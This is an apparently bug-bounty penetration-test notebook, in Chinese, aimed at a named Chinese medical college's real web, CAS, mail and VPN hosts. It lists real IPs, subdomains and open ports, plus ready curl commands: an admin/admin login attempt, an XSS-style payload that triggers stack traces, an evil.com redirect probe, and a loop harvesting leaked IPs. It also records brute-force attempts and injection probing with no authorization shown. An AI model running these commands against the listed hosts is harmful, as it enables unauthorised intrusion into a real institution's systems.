# 南京医科大学康达学院 (NJMU) 测试模式 (2026-05, 验证更新 2026-06-09)

## 目标信息
- 主站: kdc.njmu.edu.cn (202.195.176.21)
- ehall: ehall.nmukd.edu.cn (198.18.0.38)
- authserver: authserver.nmukd.edu.cn
- 系统: SUDY网站管理平台 + 金智教育(wisedu) CAS + Spring Boot
- WAF: ehall有WAF拦截Actuator

## 技术栈指纹
```
kdc.njmu.edu.cn:
  nginx 1.21.5 (Server头隐藏: ******)
  SUDY WebPlus CMS (sudy-wp-siteId)
  X-Frame-Options: SAMEORIGIN

ehall.nmukd.edu.cn:
  Server: wisedu (金智教育)
  Spring Boot Actuator (暴露)
  CAS统一身份认证

authserver.nmukd.edu.cn:
  Server: wisedu
  CAS协议 (serviceValidate/proxyValidate)
  SM2加密 (encrypt.js)
```

## 关键发现

### 1. ehall Spring Boot Actuator — 已修复 (2026-06-09验证)
```
历史(2026-05): /actuator, /actuator/env 等端点暴露
2026-06-09验证: /actuator → 302重定向到CAS登录，URL编码绕过也被WAF拦截
结论: 已修复，不再可提交
```

### 2. CAS认证服务器信息泄露 (低危)
```
authserver.nmukd.edu.cn/authserver/login
泄露: Server: wisedu
低危，单独不建议提交
```

### 3. CAS用户枚举 — 误报 (2026-06-09验证)
```
历史报告声称不同用户名返回不同消息 → 实测所有用户名均返回"您的账号尚未激活，请激活后登录！"
测试: admin/test/student/teacher/nonexistentuser123 → 全部相同响应
结论: 无法区分存在/不存在用户，不可提交
⚠️ 历史记录有误，已纠正
```

### 4. SUDY CMS错误页面泄露IP (中危) ✓ 已验证可提交
```
/_web/_portal/api/user/main.psp
→ <input id="ipAddress" value="109.122.3.227"/>
影响所有SUDY CMS子域名: kdc/kdclib/kdjw/kdxg/kdtw/kdjjjc/kdgh
真实IP: 109.122.3.227 (ping可达, ttl=128)
⚠️ 质量门禁陷阱: src-http-probe.py的control探测会将此端点判为LOGIN_OR_AUTH_REQUIRED(假阴性)，
   但手动curl可正常获取IP。验证此漏洞必须手动curl，不能依赖自动化probe结果。
⚠️ grep陷阱: PoC必须用 `grep -oP 'value="[^"]*"'` 或 `grep -o 'value="[0-9.]*"'`，
   不能用 `grep -o 'value="[0-9.]"'`（少了`*`只匹配单个字符，无输出）
⚠️ IP身份验证: 泄露IP 109.122.3.227 实测是CDN/WAF的DNS服务器(香港Alice Networks LTD)，
   不是真实服务器IP。域名解析到198.18.x.x(CDN网段)。详见 references/njmu-ip-leakage-deep-verification.md
```

### 5. 8080端口Spring Boot Actuator (低危)
```
http://kdc.njmu.edu.cn:8080/actuator → 200 (暴露链接)
http://kdc.njmu.edu.cn:8080/actuator/health → {"status":"DOWN"}
http://kdc.njmu.edu.cn:8080/actuator/env → 404
http://kdc.njmu.edu.cn:8080/actuator/configprops → 404
http://kdc.njmu.edu.cn:8080/actuator/beans → 404
http://kdc.njmu.edu.cn:8080/actuator/mappings → 404
http://kdc.njmu.edu.cn:8080/actuator/loggers → 404
http://kdc.njmu.edu.cn:8080/actuator/heapdump → 404
仅暴露health状态，无敏感信息，低危
```

### 6. Tomcat堆栈跟踪泄露 (中危) ✓ 已验证可提交
```
触发URL: /_web/_search/api/search/new.rst?keyword=%3Cscript%3Ealert(1)%3C/script%3E
返回: 完整Java堆栈跟踪，包含:
  - 服务器类型: Tomcat (Apache Coyote)
  - Java类: Http11InputBuffer.parseRequestLine, Http11Processor.service
  - 内部路径: org.apache.coyote.http11.*, org.apache.tomcat.util.net.*
  - 异常类型: java.lang.IllegalArgumentException
  - 完整调用链 (748行级别)
⚠️ 只有特定XSS payload触发，URL编码后的<script>标签触发IllegalArgumentException。
   空字节(%00)、其他特殊字符不一定触发。
PoC: curl -sk "https://kdc.njmu.edu.cn/_web/_search/api/search/new.rst?keyword=%3Cscript%3Ealert(1)%3C/script%3E" | grep -c "exception\|stack\|tomcat\|java"
```

### 7. 邮箱系统cookie泄露IP (中危) ✓ 已验证可提交
```
URL: https://mail.njmu.edu.cn/
响应头Set-Cookie包含: boc_session_site=...ip_address...109.122.3.227...
邮箱系统: 网易企业邮箱 (qiye.163.com)
PoC: curl -sk -D- "https://mail.njmu.edu.cn/" | grep -i "ip_address"
cookie格式: a:5:{s:10:"session_id";...s:10:"ip_address";s:13:"109.122.3.227";...}
⚠️ cookie是URL编码的PHP序列化字符串，grep "ip_address" 即可提取
```

### 8. CAS Open Redirect — 有白名单保护
```
测试: service=https://evil.com → 返回 "Application Not Authorized to Use IDS - CAS"
测试: service=javascript:alert(1) → WAF拦截("访问禁止" + 事件编号)
结论: CAS有service白名单验证，Open Redirect不可利用
```

### 9. 数据库端口暴露 (需认证，非漏洞)
```
202.195.176.21 端口扫描结果:
  3306/tcp (mysql) - 开放，需密码
  6379/tcp (redis) - 开放，连接被拒
  5432/tcp (postgresql) - 开放，需认证
  1433/tcp (ms-sql-s) - 开放
  1521/tcp (oracle) - 开放
  22/tcp (ssh), 21/tcp (ftp), 23/tcp (telnet) - 开放
  8080, 8443, 8888, 9090 - 开放
数据库端口均有认证保护，未发现未授权访问
⚠️ 端口暴露本身不构成漏洞，但增加了攻击面
```

## SUDY CMS关键路径
```
/_web/_ids/login/api/login/create.rst → IDS登录API (POST)
/_web/_ids/login/api/logout/create.rst → IDS登出API
/_web/_portal/api/user/main.psp → Portal用户API
/_web/_portal/api/login/main.psp → Portal登录API
/_web/_portal/api/config/main.psp → Portal配置API
/_web/_portal/api/system/main.psp → Portal系统API
/_web/_search/api/search/new.rst → 搜索API
/_admin/ → 403 (存在但被保护)
/admin/ → 403
/system/ → 403
/login.jsp → 200 (登录页面)
```

## 子域名枚举
```
# njmu.edu.cn 子域名
kdc.njmu.edu.cn → 202.195.176.21 (siteId=164)
kdclib.njmu.edu.cn → 202.195.176.21 (siteId=338, 图书馆)
kdjw.njmu.edu.cn → 202.195.176.21 (siteId=169, 教务办)
kdxg.njmu.edu.cn → 202.195.176.21 (siteId=170, 学生工作处)
kdtw.njmu.edu.cn → 202.195.176.21 (siteId=162, 团委)
kdjjjc.njmu.edu.cn → 202.195.176.21 (siteId=286, 纪委)
kdgh.njmu.edu.cn → 202.195.176.21 (工会)
www.njmu.edu.cn → 202.195.176.21
mail.njmu.edu.cn → 202.195.181.187
vpn.njmu.edu.cn → 218.94.72.98
oa.njmu.edu.cn → 202.195.176.19
webvpn.njmu.edu.cn → 202.195.188.233
ids.njmu.edu.cn → 202.195.176.25
app.njmu.edu.cn → 202.195.176.38

# nmukd.edu.cn 关联子域名 (康达学院独立域名，需单独枚举)
ehall.nmukd.edu.cn → 198.18.0.38 (金智教育办事大厅)
authserver.nmukd.edu.cn (金智教育CAS)
zp.nmukd.edu.cn
5gself.nmukd.edu.cn
res.nmukd.edu.cn
szyd.nmukd.edu.cn
vpn.nmukd.edu.cn

⚠️ 注意: src-fast-assess.py 只枚举 kdc.njmu.edu.cn 子域名，不会发现 nmukd.edu.cn。
必须用 subfinder -d nmukd.edu.cn 单独枚举。

# 更多njmu.edu.cn子域名 (subfinder枚举, 2026-06-09)
admission.njmu.edu.cn → 国际学生服务平台 (Online Service Platform for International Students)
ams.njmu.edu.cn
ecard.njmu.edu.cn → 一卡通
eclass.njmu.edu.cn → 网络思政工作中心 (SUDY CMS, siteId=357)
elearning.njmu.edu.cn → openresty反代
drcom.njmu.edu.cn → DrCOM认证
bioinfo.njmu.edu.cn
bme.njmu.edu.cn / bmei.njmu.edu.cn
bigdata.njmu.edu.cn
archives.njmu.edu.cn
caiwu.njmu.edu.cn → 财务
cwc.njmu.edu.cn / cwcx.njmu.edu.cn
dangxiao.njmu.edu.cn → 党校
dsjy.njmu.edu.cn
bookplus.njmu.edu.cn

# nmukd.edu.cn 更多子域名 (2026-06-09)
student.nmukd.edu.cn / teacher.nmukd.edu.cn / faculty.nmukd.edu.cn / staff.nmukd.edu.cn
portal.nmukd.edu.cn / jw.nmukd.edu.cn / oa.nmukd.edu.cn / mail.nmukd.edu.cn
webvpn.nmukd.edu.cn / ids.nmukd.edu.cn / one.nmukd.edu.cn
pay.nmukd.edu.cn / ecard.nmukd.edu.cn / lib.nmukd.edu.cn
test.nmukd.edu.cn / dev.nmukd.edu.cn / staging.nmukd.edu.cn / beta.nmukd.edu.cn / demo.nmukd.edu.cn
m.nmukd.edu.cn / mobile.nmukd.edu.cn / wap.nmukd.edu.cn / h5.nmukd.edu.cn
miniapp.nmukd.edu.cn / wechat.nmukd.edu.cn / applet.nmukd.edu.cn
admin.nmukd.edu.cn / api.nmukd.edu.cn / app.nmukd.edu.cn / auth.nmukd.edu.cn
cas.nmukd.edu.cn / sso.nmukd.edu.cn / login.nmukd.edu.cn
```

## 测试命令
```bash
# SUDY CMS指纹
curl -sk https://kdc.njmu.edu.cn/ | grep -i "sudy"

# IDS登录API
curl -sk -X POST "https://kdc.njmu.edu.cn/_web/_ids/login/api/login/create.rst" \
  -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=admin"

# PSP文件测试 (IP泄露) — 注意grep必须用*量词
curl -sk "https://kdc.njmu.edu.cn/_web/_portal/api/user/main.psp" | grep -oP 'value="[^"]*"'

# 批量验证IP泄露
for sub in kdc kdclib kdjw kdxg kdtw kdjjjc kdgh; do
  echo -n "$sub.njmu.edu.cn: "
  curl -sk "https://$sub.njmu.edu.cn/_web/_portal/api/user/main.psp" | grep -oP 'value="[^"]*"' | head -1
done

# Tomcat堆栈跟踪泄露
curl -sk "https://kdc.njmu.edu.cn/_web/_search/api/search/new.rst?keyword=%3Cscript%3Ealert(1)%3C/script%3E" | grep -i "exception\|stack\|tomcat\|java"

# 邮箱cookie IP泄露
curl -sk -D- "https://mail.njmu.edu.cn/" | grep -i "ip_address"

# CAS登录
curl -sk "http://authserver.nmukd.edu.cn/authserver/login"

# CAS Open Redirect测试 (有白名单)
curl -sk -D- "http://authserver.nmukd.edu.cn/authserver/login?service=https://evil.com"

# Actuator测试 (ehall已修复，8080端口仅health)
curl -sk "http://ehall.nmukd.edu.cn/actuator"
curl -sk "http://kdc.njmu.edu.cn:8080/actuator"

# 子域名枚举
subfinder -d nmukd.edu.cn -silent
```

## 报告
- /tmp/vuln_reports/njmu/ip-leak-report.txt (SUDY CMS IP泄露)
- /tmp/vuln_reports/njmu/final-report.txt (完整评估报告，含3个中危+2个低危)

## 已排除的漏洞 (2026-06-09验证)
- ehall Actuator → 已修复，302到CAS登录
- CAS用户枚举 → 所有用户名返回相同消息，误报
- CAS Open Redirect → 有白名单保护
- SQL注入 → 登录接口返回{"status":0}，无SQL错误
- 文件上传 → psp端点返回重定向
- .git/config → 404
- 目录遍历 → 无
- CORS → 未配置，无漏洞
- 数据库未授权 → 3306/6379/5432均有认证

## 全面攻击面评估 (2026-06-09 深度测试)

### SUDY CMS 加固状态
- 文件上传: 所有上传端点返回"htm file not found"或空响应
- SQL注入: 登录接口返回{"status":0}，搜索接口空响应，时间盲注1秒/布尔盲注无差异
- 文件包含: file/path/include/page/template参数无LFI
- 命令注入: cmd/command/exec参数无RCE
- SSRF: file/url/path参数无响应
- XXE: Content-Type: application/xml发送XML返回{"status":0}
- .git/.svn: 返回"htm file not found"
- XSS: 搜索接口keyword参数返回400+堆栈跟踪(已记录)
- 结论: SUDY CMS版本较新，已知漏洞已修复，安全加固较好

### ehall 办事大厅
- 所有API端点(30+)均302重定向到CAS登录
- 8080/8443/8888/9090端口无响应
- CAS认证有白名单保护
- 结论: 未发现绕过方式

### WebVPN (Sangfor EasyConnect)
- 登录接口: 返回XML ErrorCode=20004 "Invalid username or password!"
- 暴力破解防护: 多次测试后触发 ErrorCode=20041 "You are trying brute-force login"
- 短信登录: ErrorCode=20026 "unexpected user service"
- Token登录: ErrorCode=20014 "session timeout"
- 目录遍历/文件包含: 返回Error Page
- 管理员接口: 返回Error Page
- 结论: EasyConnect有完善的暴力破解防护和路径校验

### 邮箱系统 (网易企业邮箱)
- serverPrefix: entryhz.qiye.163.com (杭州节点)
- 登录流程: prelogin → RSA加密 → domainEntLogin
- 密码加密: RSA + rand拼接 + pubid
- JS文件: qiye_algorithm.js (网易自定义加密)
- 结论: 网易企业邮箱安全加固较好

### 对外开放端口 (202.195.176.21)
21(ftp), 22(ssh), 23(telnet), 25(smtp), 53(domain), 80(http),
110(pop3), 111(rpcbind), 135(msrpc), 139(netbios-ssn), 143(imap),
443(https), 445(microsoft-ds), 3306(mysql), 3389(rdp),
5432(postgresql), 6379(redis), 8080, 8443, 8888, 9090, 9200(elasticsearch), 27017(mongodb)
⚠️ 端口暴露多但均有认证保护，未发现未授权访问

### 教训总结
- 此目标属于"加固良好型"，SUDY CMS + 金智教育CAS + 网易邮箱 + EasyConnect VPN
- 已知CVE已修复，WAF有拦截，CAS有白名单
- 信息泄露(IP泄露/堆栈跟踪)是仅有的可提交发现
- 发现IP泄露后，若IP身份是CDN/WAF DNS而非origin server，价值显著降低
- 不应在已加固目标上反复重测同一攻击面，应尽早换目标
